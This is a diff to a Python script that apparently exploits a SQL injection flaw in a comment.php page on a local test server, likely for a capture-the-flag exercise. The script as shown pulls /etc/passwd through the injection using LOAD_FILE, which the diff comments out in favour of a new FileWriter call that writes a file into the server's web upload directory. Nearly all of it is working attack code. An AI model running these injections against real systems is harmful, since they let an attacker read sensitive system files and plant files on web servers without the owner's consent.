@@ -3,6 +3,7 @@
 import requests
 import sys
 
+from file_writer import FileWriter
 from tools import *
 from payloads import *
 from body_conditions import *
@@ -20,7 +21,7 @@ def test(payload):
 class MyTester(Tester):
 
     def __init__(self):
-        super(MyTester, self).__init__(lambda r: 'admin' in r.text, True)
+        super(MyTester, self).__init__(lambda r: 'admin' in r.text, False)
 
     def get_request(self, payload):
         return requests.get('http://127.0.0.1:8181/comment.php', params={'id': '1 {}'.format(payload), 'log': '1'},
@@ -32,7 +33,11 @@ tester = MyTester()
 sf = StringFinder(tester)
 
 # print(sf.read_string("(SELECT {})".format(encode_str('coucou'))))
-print(sf.read_file('/etc/passwd'))
+# print(sf.read_file('/etc/passwd'))
+
+fw = FileWriter(lambda payload: requests.get('http://127.0.0.1:8181/comment.php', params={'log': '1', 'id': '1 {}'.format(payload)}, verify=False), 'FLAG')
+
+fw.write('/var/www/html/upload/flag.txt')
 
 # print(tester.test("AND LENGTH(LOAD_FILE(0x2f6574632f706173737764))>0"))
 
